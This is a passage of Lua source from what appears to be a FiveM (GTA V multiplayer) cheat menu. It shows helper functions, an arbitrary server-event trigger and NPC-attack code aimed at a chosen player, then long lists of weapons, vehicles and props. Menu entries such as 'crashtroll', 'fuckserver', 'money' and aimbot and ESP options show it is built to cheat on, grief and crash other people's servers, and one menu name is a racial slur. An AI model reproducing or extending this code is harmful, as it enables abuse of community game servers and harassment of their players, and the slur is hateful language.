		SetEntityAsMissionEntity(Object, 1, 1)
		DeleteEntity(Object)
		SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
		DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
	end;
	FiveM.DirtyVehicle = function(bi)
		SetVehicleDirtLevel(bi, 15.0)
	end;
	FiveM.CleanVehicle = function(bi)
		SetVehicleDirtLevel(bi, 1.0)
	end;
	FiveM.GetPlayers = function()
		local br = {}
		for i = 0, 255, 1 do
			local ped = GetPlayerPed(i)
			if DoesEntityExist(ped) then
				table.insert(br, i)
			end
		end;
		return br
	end;
	FiveM.GetClosestPlayer = function(bs)
		local br = FiveM.GetPlayers()
		local bt = -1;
		local bu = -1;
		local bv = false;
		local bw = PlayerPedId()
		local bx = PlayerId()
		if bs == nil then
			bv = true;
			bs = GetEntityCoords(bw)
		end;
		for i = 1, #br, 1 do
			local by = GetPlayerPed(br[i])
			if not bv or bv and br[i] ~= bx then
				local bz = GetEntityCoords(by)
				local distance = GetDistanceBetweenCoords(bz, bs.x, bs.y, bs.z, true)
				if bt == -1 or bt > distance then
					bu = br[i]
					bt = distance
				end
			end
		end;
		return bu, bt
	end;
	FiveM.GetWaypoint = function()
		local bA = nil;
		if DoesBlipExist(GetFirstBlipInfoId(8)) then
			local bB = GetBlipInfoIdIterator(8)
			local bC = GetFirstBlipInfoId(8, bB)
			bA = Citizen.InvokeNative(18049441090438849000, bC, Citizen.ResultAsVector())
		end;
		print(bA)
		return bA
	end;
	FiveM.GetSafePlayerName = function(aM)
		if string.IsNullOrEmpty(aM) then
			return ""
		end;
		return aM:gsub("%^", "\\^"):gsub("%~", "\\~"):gsub("%<", "«"):gsub("%>", "-->")
	end;
	FiveM.SetResourceLocked = function(bD, bE)
		Citizen.CreateThread(function()
			if bE ~= nil then
				local bF, item_subtype = bE()
			end;
			if GetResourceState(bD) == "started" then
				if bE ~= nil then
					bE:Enabled(true)
				end;
				if item_subtype == "UIMenuItem" then
					bE:SetRightBadge(BadgeStyle.None)
				end
			else
				if bE ~= nil then
					bE:Enabled(false)
				end;
				if item_subtype == "UIMenuItem" then
					bE:SetRightBadge(BadgeStyle.Lock)
				end
			end
		end)
	end;
	FiveM.TriggerCustomEvent = function(bG, A, ...)
		local bH = msgpack.pack({
			...
		})
		if bG then
			TriggerServerEventInternal(A, bH, bH:len())
		else
			TriggerEventInternal(A, bH, bH:len())
		end
	end
end;
local function bI(bJ)
	local bK = false;
	while bK == false do
		bK = NetworkRequestControlOfEntity(bJ)
		if bK == true or bK == 1 then
			break
		end;
		if NetworkHasControlOfEntity(ped) == true and bK == true or NetworkHasControlOfEntity(ped) == true and bK == 1 then
			return true
		else
			return false
		end
	end
end;
local function bL(by, ped, bM, bN)
	if bM == 1 or bM == true then
		bI(ped)
		TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
		SetPedCanSwitchWeapon(ped, true)
	else
		if bN == 1 or bN == true then
			local bO = GetEntityModel(ped)
			if DoesEntityExist(ped) then
				DeletePed(ped)
				RequestModel(bO)
				local bs = GetEntityCoords(GetPlayerPed(by), true)
				if HasModelLoaded(bO) then
					local bP = CreatePed(21, bO, bs.x, bs.y, bs.z, 0, 1, 0)
					if GetEntityHealth(bP) == GetEntityMaxHealth(bP) then
						SetModelAsNoLongerNeeded(bO)
						bI(bP)
						TaskCombatPed(bP, GetPlayerPed(by), 0, 16)
						SetPedCanSwitchWeapon(ped, true)
					end
				end
			end
		else
			local bQ = GetPlayerPed(by)
			bI(ped)
			TaskCombatPed(ped, bQ, 0, 16)
		end
	end
end;
local bS = "50.0"
menulist = {
	"StupidNiggaPaster",
	"player",
	"self",
	"weapon",
	"vehicle",
	"world",
	"misc",
	"teleport",
	"lua",
	"settingslol",
	"allplayer",
	"playeroptions",
	"troll",
	"crashtroll",
	"appearance",
	"modifyskintextures",
	"modifyhead",
	"modifiers",
	"skinsmodels",
	"weaponspawnerplayer",
	"weaponspawner",
	"WeaponCustomization",
	"melee",
	"pistol",
	"shotgun",
	"smg",
	"assault",
	"sniper",
	"thrown",
	"heavy",
	"vehiclespawner",
	"vehiclemods",
	"vehiclemenu",
	"VehBoostMenu",
	"vehiclecolors",
	"vehiclecolors_primary",
	"vehiclecolors_secondary",
	"primary_classic",
	"primary_matte",
	"primary_metal",
	"secondary_classic",
	"secondary_matte",
	"secondary_metal",
	"vehicletuning",
	"compacts",
	"sedans",
	"suvs",
	"coupes",
	"muscle",
	"sportsclassics",
	"sports",
	"super",
	"AmX",
	"offroad",
	"industrial",
	"utility",
	"vans",
	"cycles",
	"boats",
	"helicopters",
	"planes",
	"service",
	"commercial",
	"fuckserver",
	"objectspawner",
	"objectlist",
	"weather",
	"time",
	"credits",
	"esp",
	"webradio",
	"saveload",
	"pois",
	"esx",
	"vrp",
	"other",
	"money",
	"player1",
	"drogas",
	"mecanico"
}
faceItemsList = {}
faceTexturesList = {}
hairItemsList = {}
hairTextureList = {}
maskItemsList = {}
hatItemsList = {}
hatTexturesList = {}
NoclipSpeedOps = {
	1,
	5,
	10,
	20,
	30
}
NoclipSpeed = 1;
oldSpeed = nil;
ForcefieldRadiusOps = {
	5.0,
	10.0,
	15.0,
	20.0,
	50.0
}
ForcefieldRadius = 5.0;
FastCB = {
	1.0,
	1.09,
	1.19,
	1.29,
	1.39,
	1.49
}
FastCBWords = {
	"+0%",
	"+20%",
	"+40%",
	"+60%",
	"+80%",
	"+100%"
}
FastRunMultiplier = 1.0;
FastSwimMultiplier = 1.0;
RotationOps = {
	0,
	45,
	90,
	135,
	180
}
ObjRotation = 90;
GravityOps = {
	0.0,
	5.0,
	9.8,
	50.0,
	100.0,
	200.0,
	500.0,
	1000.0,
	9999.9
}
GravityOpsWords = {
	"0",
	"5",
	"Default",
	"50",
	"100",
	"200",
	"500",
	"1000",
	"9999"
}
GravAmount = 9.8;
SpeedModOps = {
	1.0,
	1.5,
	2.0,
	3.0,
	5.0,
	10.0,
	20.0,
	50.0,
	100.0,
	500.0,
	1000.0
}
SpeedModAmt = 1.0;
ESPDistanceOps = {
	50.0,
	100.0,
	500.0,
	1000.0,
	2000.0,
	5000.0,
	10000.0
}
EspDistance = 500.0;
ESPRefreshOps = {
	"0ms",
	"100ms",
	"250ms",
	"500ms",
	"1s",
	"2s",
	"5s"
}
ESPRefreshTime = 0;
AimbotBoneOps = {
	"Head",
	"Chest",
	"Left Arm",
	"Right Arm",
	"Left Leg",
	"Right Leg",
	"Dick"
}
AimbotBone = "SKEL_HEAD"
ClothingSlots = {
	1,
	2,
	3,
	4,
	5
}
PedAttackOps = {
	"All Weapons",
	"Melee Weapons",
	"Pistols",
	"Heavy Weapons"
}
PedAttackType = 1;
RadiosList = {
	0,
	1,
	2,
	3,
	4,
	5,
	6,
	7,
	8,
	9,
	10,
	11,
	12,
	13,
	14,
	15,
	16,
	17,
	18
}
RadiosListWords = {
	"Los Santos Rock Radio",
	"Non-Stop-Pop FM",
	"Radio Los Santos",
	"Channel X",
	"West Coast Talk Radio",
	"Rebel Radio",
	"Soulwax FM",
	"East Los FM",
	"West Coast Classics",
	"Blue Ark",
	"Worldwide FM",
	"FlyLo FM",
	"The Lowdown 91.1",
	"The Lab",
	"Radio Mirror Park",
	"Space 103.2",
	"Vinewood Boulevard Radio",
	"Blonded Los Santos 97.8 FM",
	"Blaine County Radio"
}
WeathersList = {
	"ﻲﻓﺎﺻ",
	"ﺍﺪﺟ ﺲﻤﺸﻣ",
	"ﻢﻴﻏ",
	"ﻢﺋﺎﻏ",
	"ﺮﻄﻤﻣ",
	"ﻲﻓﺎﺻ",
	"ﺪﻋﺭ",
	"ﻦﺧﺪﻣ",
	"ﺏﺎﺒﺿ",
	"ﺞﻠﺛ",
	"ﺮﻄﻤﻣ ﺞﻠﺛ",
	"ﺮﻴﻬﻄﺗ ﻮﺟ"
}
objs_tospawn = {
	"stt_prop_stunt_track_start",
	"prop_container_01a",
	"prop_contnr_pile_01a",
	"ce_xr_ctr2",
	"stt_prop_ramp_jump_xxl",
	"hei_prop_carrier_jet",
	"prop_parking_hut_2",
	"csx_seabed_rock3_",
	"db_apart_03_",
	"db_apart_09_",
	"stt_prop_stunt_tube_l",
	"stt_prop_stunt_track_dwuturn",
	"xs_prop_hamburgher_wl",
	"sr_prop_spec_tube_xxs_01a",
	"prop_air_bigradar",
	"p_tram_crash_s",
	"prop_windmill_01",
	"prop_start_gate_01",
	"prop_trailer_01_new",
	"sr_prop_sr_track_block_01",
	"sr_prop_spec_tube_xxs_04a",
	"stt_prop_stunt_soccer_sball",
	"stt_prop_stunt_track_cutout",
	"stt_prop_stunt_target_small",
	"prop_cj_big_boat"
}
local bT = {
	"WEAPON_UNARMED",
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_POOLCUE",
	"WEAPON_PIPEWRENCH",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_REVOLVER_MK2",
	"WEAPON_DOUBLEACTION",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_SNSPISTOL_MK2",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_RAYPISTOL",
	"WEAPON_MICROSMG",
	"WEAPON_MINISMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_RAYCARBINE",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_SPECIALCARBINE_MK2",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_BULLPUPRIFLE_MK2",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_PUMPSHOTGUN_MK2",
	"WEAPON_SWEEPERSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_MARKSMANRIFLE_MK2",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_MINIGUN",
	"WEAPON_FIREWORK",
	"WEAPON_RAILGUN",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_COMPACTLAUNCHER",
	"WEAPON_RAYMINIGUN"
}
local bU = {
	{
		"WEAPON_KNIFE",
		"Knife"
	},
	{
		"WEAPON_KNUCKLE",
		"Brass Knuckles"
	},
	{
		"WEAPON_NIGHTSTICK",
		"Nightstick"
	},
	{
		"WEAPON_HAMMER",
		"Hammer"
	},
	{
		"WEAPON_BAT",
		"Baseball Bat"
	},
	{
		"WEAPON_GOLFCLUB",
		"Golf Club"
	},
	{
		"WEAPON_CROWBAR",
		"Crowbar"
	},
	{
		"WEAPON_BOTTLE",
		"Bottle"
	},
	{
		"WEAPON_DAGGER",
		"Dagger"
	},
	{
		"WEAPON_HATCHET",
		"Hatchet"
	},
	{
		"WEAPON_MACHETE",
		"Machete"
	},
	{
		"WEAPON_FLASHLIGHT",
		"Flashlight"
	},
	{
		"WEAPON_SWITCHBLADE",
		"Switchblade"
	},
	{
		"WEAPON_POOLCUE",
		"Pool Cue"
	},
	{
		"WEAPON_PIPEWRENCH",
		"Pipe Wrench"
	}
}
local bV = {
	{
		"WEAPON_GRENADE",
		"Grenade"
	},
	{
		"WEAPON_STICKYBOMB",
		"Sticky Bomb"
	},
	{
		"WEAPON_PROXMINE",
		"Proximity Mine"
	},
	{
		"WEAPON_BZGAS",
		"BZ Gas"
	},
	{
		"WEAPON_SMOKEGRENADE",
		"Smoke Grenade"
	},
	{
		"WEAPON_MOLOTOV",
		"Molotov"
	},
	{
		"WEAPON_FIREEXTINGUISHER",
		"Fire Extinguisher"
	},
	{
		"WEAPON_PETROLCAN",
		"Fuel Can"
	},
	{
		"WEAPON_SNOWBALL",
		"Snowball"
	},
	{
		"WEAPON_FLARE",
		"Flare"
	},
	{
		"WEAPON_BALL",
		"Baseball"
	}
}
local bW = {
	{
		"WEAPON_PISTOL",
		"Pistol"
	},
	{
		"WEAPON_PISTOL_MK2",
		"Pistol Mk II"
	},
	{
		"WEAPON_COMBATPISTOL",
		"Combat Pistol"
	},
	{
		"WEAPON_APPISTOL",
		"AP Pistol"
	},
	{
		"WEAPON_REVOLVER",
		"Revolver"
	},
	{
		"WEAPON_REVOLVER_MK2",
		"Revolver Mk II"
	},
	{
		"WEAPON_DOUBLEACTION",
		"Double Action Revolver"
	},
	{
		"WEAPON_PISTOL50",
		"Pistol .50"
	},
	{
		"WEAPON_SNSPISTOL",
		"SNS Pistol"
	},
	{
		"WEAPON_SNSPISTOL_MK2",
		"SNS Pistol Mk II"
	},
	{
		"WEAPON_HEAVYPISTOL",
		"Heavy Pistol"
	},
	{
		"WEAPON_VINTAGEPISTOL",
		"Vintage Pistol"
	},
	{
		"WEAPON_STUNGUN",
		"Tazer"
	},
	{
		"WEAPON_FLAREGUN",
		"Flaregun"
	},
	{
		"WEAPON_MARKSMANPISTOL",
		"Marksman Pistol"
	},
	{
		"WEAPON_RAYPISTOL",
		"Up-n-Atomizer"
	}
}
local bX = {
	{
		"WEAPON_MICROSMG",
		"Micro SMG"
	},
	{
		"WEAPON_MINISMG",
		"Mini SMG"
	},
	{
		"WEAPON_SMG",
		"SMG"
	},
	{
		"WEAPON_SMG_MK2",
		"SMG Mk II"
	},
	{
		"WEAPON_ASSAULTSMG",
		"Assault SMG"
	},
	{
		"WEAPON_COMBATPDW",
		"Combat PDW"
	},
	{
		"WEAPON_GUSENBERG",
		"Gunsenberg"
	},
	{
		"WEAPON_MACHINEPISTOL",
		"Machine Pistol"
	},
	{
		"WEAPON_MG",
		"MG"
	},
	{
		"WEAPON_COMBATMG",
		"Combat MG"
	},
	{
		"WEAPON_COMBATMG_MK2",
		"Combat MG Mk II"
	},
	{
		"WEAPON_RAYCARBINE",
		"Unholy Hellbringer"
	}
}
local bY = {
	{
		"WEAPON_ASSAULTRIFLE",
		"Assault Rifle"
	},
	{
		"WEAPON_ASSAULTRIFLE_MK2",
		"Assault Rifle Mk II"
	},
	{
		"WEAPON_CARBINERIFLE",
		"Carbine Rifle"
	},
	{
		"WEAPON_CARBINERIFLE_MK2",
		"Carbine Rigle Mk II"
	},
	{
		"WEAPON_ADVANCEDRIFLE",
		"Advanced Rifle"
	},
	{
		"WEAPON_SPECIALCARBINE",
		"Special Carbine"
	},
	{
		"WEAPON_SPECIALCARBINE_MK2",
		"Special Carbine Mk II"
	},
	{
		"WEAPON_BULLPUPRIFLE",
		"Bullpup Rifle"
	},
	{
		"WEAPON_BULLPUPRIFLE_MK2",
		"Bullpup Rifle Mk II"
	},
	{
		"WEAPON_COMPACTRIFLE",
		"Compact Rifle"
	}
}
local bZ = {
	{
		"WEAPON_PUMPSHOTGUN",
		"Pump Shotgun"
	},
	{
		"WEAPON_PUMPSHOTGUN_MK2",
		"Pump Shotgun Mk II"
	},
	{
		"WEAPON_SWEEPERSHOTGUN",
		"Sweeper Shotgun"
	},
	{
		"WEAPON_SAWNOFFSHOTGUN",
		"Sawed-Off Shotgun"
	},
	{
		"WEAPON_BULLPUPSHOTGUN",
		"Bullpup Shotgun"
	},
	{
		"WEAPON_ASSAULTSHOTGUN",
		"Assault Shotgun"
	},
	{
		"WEAPON_MUSKET",
		"Musket"
	},
	{
		"WEAPON_HEAVYSHOTGUN",
		"Heavy Shotgun"
	},
	{
		"WEAPON_DBSHOTGUN",
		"Double Barrel Shotgun"
	}
}
local b_ = {
	{
		"WEAPON_SNIPERRIFLE",
		"Sniper Rifle"
	},
	{
		"WEAPON_HEAVYSNIPER",
		"Heavy Sniper"
	},
	{
		"WEAPON_HEAVYSNIPER_MK2",
		"Heavy Sniper Mk II"
	},
	{
		"WEAPON_MARKSMANRIFLE",
		"Marksman Rifle"
	},
	{
		"WEAPON_MARKSMANRIFLE_MK2",
		"Marksman Rifle Mk II"
	}
}
local c0 = {
	{
		"WEAPON_GRENADELAUNCHER",
		"Grenade Launcher"
	},
	{
		"WEAPON_RPG",
		"RPG"
	},
	{
		"WEAPON_MINIGUN",
		"Minigun"
	},
	{
		"WEAPON_FIREWORK",
		"Firework Launcher"
	},
	{
		"WEAPON_RAILGUN",
		"Railgun"
	},
	{
		"WEAPON_HOMINGLAUNCHER",
		"Homing Launcher"
	},
	{
		"WEAPON_COMPACTLAUNCHER",
		"Compact Grenade Launcher"
	},
	{
		"WEAPON_RAYMINIGUN",
		"Widowmaker"
	}
}
local c1 = {
	"BLISTA",
	"BRIOSO",
	"DILETTANTE",
	"DILETTANTE2",
	"ISSI2",
	"ISSI3",
	"ISSI4",
	"ISSI5",
	"ISSI6",
	"PANTO",
	"PRAIRIE",
	"RHAPSODY"
}
local c2 = {
	"ASEA",
	"ASEA2",
	"ASTEROPE",
	"COG55",
	"COG552",
	"COGNOSCENTI",
	"COGNOSCENTI2",
	"EMPEROR",
	"EMPEROR2",
	"EMPEROR3",
	"FUGITIVE",
	"GLENDALE",
	"INGOT",
	"INTRUDER",
	"LIMO2",
	"PREMIER",
	"PRIMO",
	"PRIMO2",
	"REGINA",
	"ROMERO",
	"SCHAFTER2",
	"SCHAFTER5",
	"SCHAFTER6",
	"STAFFORD",
	"STANIER",
	"STRATUM",
	"STRETCH",
	"SUPERD",
	"SURGE",
	"TAILGATER",
	"WARRENER",
	"WASHINGTON"
}
local c3 = {
	"BALLER",
	"BALLER2",
	"BALLER3",
	"BALLER4",
	"BALLER5",
	"BALLER6",
	"BJXL",
	"CAVALCADE",
	"CAVALCADE2",
	"CONTENDER",
	"DUBSTA",
	"DUBSTA2",
	"FQ2",
	"GRANGER",
	"GRESLEY",
	"HABANERO",
	"HUNTLEY",
	"LANDSTALKER",
	"MESA",
	"MESA2",
	"PATRIOT",
	"PATRIOT2",
	"RADI",
	"ROCOTO",
	"SEMINOLE",
	"SERRANO",
	"TOROS",
	"XLS",
	"XLS2"
}
local c4 = {
	"COGCABRIO",
	"EXEMPLAR",
	"F620",
	"FELON",
	"FELON2",
	"JACKAL",
	"ORACLE",
	"ORACLE2",
	"SENTINEL",
	"SENTINEL2",
	"WINDSOR",
	"WINDSOR2",
	"ZION",
	"ZION2"
}
local c5 = {
	"BLADE",
	"BUCCANEER",
	"BUCCANEER2",
	"CHINO",
	"CHINO2",
	"CLIQUE",
	"COQUETTE3",
	"DEVIANT",
	"DOMINATOR",
	"DOMINATOR2",
	"DOMINATOR3",
	"DOMINATOR4",
	"DOMINATOR5",
	"DOMINATOR6",
	"DUKES",
	"DUKES2",
	"ELLIE",
	"FACTION",
	"FACTION2",
	"FACTION3",
	"GAUNTLET",
	"GAUNTLET2",
	"HERMES",
	"HOTKNIFE",
	"HUSTLER",
	"IMPALER",
	"IMPALER2",
	"IMPALER3",
	"IMPALER4",
	"IMPERATOR",
	"IMPERATOR2",
	"IMPERATOR3",
	"LURCHER",
	"MOONBEAM",
	"MOONBEAM2",
	"NIGHTSHADE",
	"PHOENIX",
	"PICADOR",
	"RATLOADER",
	"RATLOADER2",
	"RUINER",
	"RUINER2",
	"RUINER3",
	"SABREGT",
	"SABREGT2",
	"SLAMVAN",
	"SLAMVAN2",
	"SLAMVAN3",
	"SLAMVAN4",
	"SLAMVAN5",
	"SLAMVAN6",
	"STALION",
	"STALION2",
	"TAMPA",
	"TAMPA3",
	"TULIP",
	"VAMOS",
	"VIGERO",
	"VIRGO",
	"VIRGO2",
	"VIRGO3",
	"VOODOO",
	"VOODOO2",
	"YOSEMITE"
}
local c6 = {
	"ARDENT",
	"BTYPE",
	"BTYPE2",
	"BTYPE3",
	"CASCO",
	"CHEBUREK",
	"CHEETAH2",
	"COQUETTE2",
	"DELUXO",
	"FAGALOA",
	"FELTZER3",
	"GT500",
	"INFERNUS2",
	"JB700",
	"JESTER3",
	"MAMBA",
	"MANANA",
	"MICHELLI",
	"MONROE",
	"PEYOTE",
	"PIGALLE",
	"RAPIDGT3",
	"RETINUE",
	"SAVESTRA",
	"STINGER",
	"STINGERGT",
	"STROMBERG",
	"SWINGER",
	"TORERO",
	"TORNADO",
	"TORNADO2",
	"TORNADO3",
	"TORNADO4",
	"TORNADO5",
	"TORNADO6",
	"TURISMO2",
	"VISERIS",
	"Z190",
	"ZTYPE"
}
local c7 = {
	"ALPHA",
	"BANSHEE",
	"BESTIAGTS",
	"BLISTA2",
	"BLISTA3",
	"BUFFALO",
	"BUFFALO2",
	"BUFFALO3",
	"CARBONIZZARE",
	"COMET2",
	"COMET3",
	"COMET4",
	"COMET5",
	"COQUETTE",
	"ELEGY",
	"ELEGY2",
	"FELTZER2",
	"FLASHGT",
	"FUROREGT",
	"FUSILADE",
	"FUTO",
	"GB200",
	"HOTRING",
	"ITALIGTO",
	"JESTER",
	"JESTER2",
	"KHAMELION",
	"KURUMA",
	"KURUMA2",
	"LYNX",
	"MASSACRO",
	"MASSACRO2",
	"NEON",
	"NINEF",
	"NINEF2",
	"OMNIS",
	"PARIAH",
	"PENUMBRA",
	"RAIDEN",
	"RAPIDGT",
	"RAPIDGT2",
	"RAPTOR",
	"REVOLTER",
	"RUSTON",
	"SCHAFTER2",
	"SCHAFTER3",
	"SCHAFTER4",
	"SCHAFTER5",
	"SCHLAGEN",
	"SCHWARZER",
	"SENTINEL3",
	"SEVEN70",
	"SPECTER",
	"SPECTER2",
	"SULTAN",
	"SURANO",
	"TAMPA2",
	"TROPOS",
	"VERLIERER2",
	"ZR380",
	"ZR3802",
	"ZR3803"
}
local c8 = {
	"ADDER",
	"AUTARCH",
	"BANSHEE2",
	"BULLET",
	"CHEETAH",
	"CYCLONE",
	"DEVESTE",
	"ENTITYXF",
	"ENTITY2",
	"FMJ",
	"GP1",
	"INFERNUS",
	"ITALIGTB",
	"ITALIGTB2",
	"LE7B",
	"NERO",
	"NERO2",
	"OSIRIS",
	"PENETRATOR",
	"PFISTER811",
	"PROTOTIPO",
	"REAPER",
	"SC1",
	"SCRAMJET",
	"SHEAVA",
	"SULTANRS",
	"T20",
	"TAIPAN",
	"TEMPESTA",
	"TEZERACT",
	"TURISMOR",
	"TYRANT",
	"TYRUS",
	"VACCA",
	"VAGNER",
	"VIGILANTE",
	"VISIONE",
	"VOLTIC",
	"VOLTIC2",
	"XA21",
	"ZENTORNO"
}
local c9 = {
	"NEON",
	"SULTAN",
	"SULTANRS",
	"C7",
	"C8",
	"NQSRT",
	"CONTGT2011",
	"CHALLENGER",
	"C63HR",
	"reaper",
	"7rbj",
	"rmodmustang",
	"b6mr",
	"rmode63s",
	"MUSTANG",
	"rmodzl1",
	"SVOLITO2",
	"DUBSTA",
	"venom"
}
local ca = {
	"BFINJECTION",
	"BIFTA",
	"BLAZER",
	"BLAZER2",
	"BLAZER3",
	"BLAZER4",
	"BLAZER5",
	"BODHI2",
	"BRAWLER",
	"BRUISER",
	"BRUISER2",
	"BRUISER3",
	"BRUTUS",
	"BRUTUS2",
	"BRUTUS3",
	"CARACARA",
	"DLOADER",
	"DUBSTA3",
	"DUNE",
	"DUNE2",
	"DUNE3",
	"DUNE4",
	"DUNE5",
	"FREECRAWLER",
	"INSURGENT",
	"INSURGENT2",
	"INSURGENT3",
	"KALAHARI",
	"KAMACHO",
	"MARSHALL",
	"MENACER",
	"MESA3",
	"MONSTER",
	"MONSTER3",
	"MONSTER4",
	"MONSTER5",
	"NIGHTSHARK",
	"RANCHERXL",
	"RANCHERXL2",
	"RCBANDITO",
	"REBEL",
	"REBEL2",
	"RIATA",
	"SANDKING",
	"SANDKING2",
	"TECHNICAL",
	"TECHNICAL2",
	"TECHNICAL3",
	"TROPHYTRUCK",
	"TROPHYTRUCK2"
}
local cb = {
	"BULLDOZER",
	"CUTTER",
	"DUMP",
	"FLATBED",
	"GUARDIAN",
	"HANDLER",
	"MIXER",
	"MIXER2",
	"RUBBLE",
	"TIPTRUCK",
	"TIPTRUCK2"
}
local cc = {
	"AIRTUG",
	"CADDY",
	"CADDY2",
	"CADDY3",
	"DOCKTUG",
	"FORKLIFT",
	"TRACTOR2",
	"TRACTOR3",
	"MOWER",
	"RIPLEY",
	"SADLER",
	"SADLER2",
	"SCRAP",
	"TOWTRUCK",
	"TOWTRUCK2",
	"TRACTOR",
	"UTILLITRUCK",
	"UTILLITRUCK2",
	"UTILLITRUCK3",
	"ARMYTRAILER",
	"ARMYTRAILER2",
	"FREIGHTTRAILER",
	"ARMYTANKER",
	"TRAILERLARGE",
	"DOCKTRAILER",
	"TR3",
	"TR2",
	"TR4",
	"TRFLAT",
	"TRAILERS",
	"TRAILERS4",
	"TRAILERS2",
	"TRAILERS3",
	"TVTRAILER",
	"TRAILERLOGS",
	"TANKER",
	"TANKER2",
	"BALETRAILER",
	"GRAINTRAILER",
	"BOATTRAILER",
	"RAKETRAILER",
	"TRAILERSMALL"
}
local cd = {
	"BISON",
	"BISON2",
	"BISON3",
	"BOBCATXL",
	"BOXVILLE",
	"BOXVILLE2",
	"BOXVILLE3",
	"BOXVILLE4",
	"BOXVILLE5",
	"BURRITO",
	"BURRITO2",
	"BURRITO3",
	"BURRITO4",
	"BURRITO5",
	"CAMPER",
	"GBURRITO",
	"GBURRITO2",
	"JOURNEY",
	"MINIVAN",
	"MINIVAN2",
	"PARADISE",
	"PONY",
	"PONY2",
	"RUMPO",
	"RUMPO2",
	"RUMPO3",
	"SPEEDO",
	"SPEEDO2",
	"SPEEDO4",
	"SURFER",
	"SURFER2",
	"TACO",
	"YOUGA",
	"YOUGA2"
}
local ce = {
	"BMX",
	"CRUISER",
	"FIXTER",
	"SCORCHER",
	"TRIBIKE",
	"TRIBIKE2",
	"TRIBIKE3"
}
local cf = {
	"DINGHY",
	"DINGHY2",
	"DINGHY3",
	"DINGHY4",
	"JETMAX",
	"MARQUIS",
	"PREDATOR",
	"SEASHARK",
	"SEASHARK2",
	"SEASHARK3",
	"SPEEDER",
	"SPEEDER2",
	"SQUALO",
	"SUBMERSIBLE",
	"SUBMERSIBLE2",
	"SUNTRAP",
	"TORO",
	"TORO2",
	"TROPIC",
	"TROPIC2",
	"TUG"
}
local cg = {
	"AKULA",
	"ANNIHILATOR",
	"BUZZARD",
	"BUZZARD2",
	"CARGOBOB",
	"CARGOBOB2",
	"CARGOBOB3",
	"CARGOBOB4",
	"FROGGER",
	"FROGGER2",
	"HAVOK",
	"HUNTER",
	"MAVERICK",
	"POLMAV",
	"SAVAGE",
	"SEASPARROW",
	"SKYLIFT",
	"SUPERVOLITO",
	"SUPERVOLITO2",
	"SWIFT",
	"SWIFT2",
	"VALKYRIE",
	"VALKYRIE2",
	"VOLATUS"
}
local ch = {
	"ALPHAZ1",
	"AVENGER",
	"AVENGER2",
	"BESRA",
	"BLIMP",
	"BLIMP2",
	"BLIMP3",
	"BOMBUSHKA",
	"CARGOPLANE",
	"CUBAN800",
	"DODO",
	"DUSTER",
	"HOWARD",
	"HYDRA",
	"JET",
	"LAZER",
	"LUXOR",
	"LUXOR2",
	"MAMMATUS",
	"MICROLIGHT",
	"MILJET",
	"MOGUL",
	"MOLOTOK",
	"NIMBUS",
	"NOKOTA",
	"PYRO",
	"ROGUE",
	"SEABREEZE",
	"SHAMAL",
	"STARLING",
	"STRIKEFORCE",
	"STUNT",
	"TITAN",
	"TULA",
	"VELUM",
	"VELUM2",
	"VESTRA",
	"VOLATOL"
}
local ci = {
	"AIRBUS",
	"BRICKADE",
	"BUS",
	"COACH",
	"PBUS2",
	"RALLYTRUCK",
	"RENTALBUS",
	"TAXI",
	"TOURBUS",
	"TRASH",
	"TRASH2",
	"WASTELANDER",
	"AMBULANCE",
	"FBI",
	"FBI2",
	"FIRETRUK",
	"LGUARD",
	"PBUS",
	"POLICE",
	"POLICE2",
	"POLICE3",
	"POLICE4",
	"POLICEB",
	"POLICEOLD1",
	"POLICEOLD2",
	"POLICET",
	"POLMAV",
	"PRANGER",
	"PREDATOR",
	"RIOT",
	"RIOT2",
	"SHERIFF",
	"SHERIFF2",
	"APC",
	"BARRACKS",
	"BARRACKS2",
	"BARRACKS3",
	"BARRAGE",
	"CHERNOBOG",
	"CRUSADER",
